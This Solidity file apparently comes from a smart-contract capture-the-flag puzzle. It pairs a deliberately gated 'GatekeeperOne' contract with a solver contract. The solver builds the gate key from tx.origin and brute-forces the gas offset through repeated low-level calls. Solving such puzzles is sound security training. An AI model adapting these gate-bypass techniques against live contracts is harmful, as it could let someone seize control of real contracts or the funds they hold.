// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneSolver {
    function solve(address gatekeeper) public returns (bool) {
        uint64 key = 0x1000000000000000;
        key = key + uint16(uint160(tx.origin));
        for (uint256 i = 200; i < 300; i++) {
            (bool success, ) = address(gatekeeper).call{gas: 8191*3 + i}(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
            if (success) {
                return true;
            }
        }
        return false;
        // return GatekeeperOne(gatekeeper).enter{gas: 8191*3 + 271}(bytes8(key));
    }
}